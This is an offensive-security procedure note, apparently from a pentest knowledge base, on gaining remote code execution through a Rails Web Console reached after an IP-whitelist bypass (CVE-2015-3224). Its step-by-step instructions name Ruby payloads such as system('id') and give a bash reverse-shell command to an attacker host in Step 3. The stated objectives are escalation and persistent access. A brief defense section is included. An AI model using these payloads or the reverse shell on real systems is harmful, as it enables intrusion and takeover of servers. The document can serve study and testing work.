---
tags:
  - rce
  - ruby-execution
  - web-console
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:28.630Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 2772dd05-aebb-4ced-895a-dbfba3741eff
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Command-Line Interface]]'
---
# Execute-Arbitrary-Ruby-Code-via-Web-Console

## Summary

This procedure uses the bypassed Rails Web Console to input and evaluate arbitrary Ruby code, enabling remote code execution including shell command invocation in the target environment.

## Description

After bypassing the IP whitelist, the Web Console provides an interactive interface at /rails/console for executing Ruby statements. This allows attackers to run system commands via Ruby's `system()` or backtick execution, leading to full RCE. In development/test modes, this can read files, execute OS commands, or pivot further. Discovered as part of CVE-2015-3224 by Phenoelit.

## Requirements

1. Successful IP bypass and access to /rails/console
2. Basic Ruby knowledge for payload crafting
3. Browser or HTTP client for interaction

## Defense

Defensive measures and detection strategies:

- Explicitly disable Web Console in all non-dev environments
- Use environment variables to lock down console access
- Monitor for unusual Ruby evaluations or system calls in logs

## Objectives

1. Evaluate Ruby expressions for information gathering
2. Invoke shell commands for RCE
3. Achieve persistent or escalated access

## Instructions

### Step 1: Access the Console Interface

**Context**: Load the bypassed endpoint to obtain the input form.

Navigate to http://target:3000/rails/console in a browser or via curl follow-up; the page should render the console without errors.

### Step 2: Input Ruby Payload

**Context**: Submit arbitrary Ruby code via the console's evaluation form.

In the input field, enter code like `puts 'Hello from RCE'` and submit. For shell access, use `system('id')` or `` `ls` `` to execute OS commands.

### Step 3: Observe and Escalate

**Context**: Review output and chain to further exploits.

Check the response for execution results (e.g., command output). Escalate by writing files or spawning shells, e.g., `system('bash -i >& /dev/tcp/attacker-ip/4444 0>&1')`.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[ruby-execution]]
- [[web-console]]
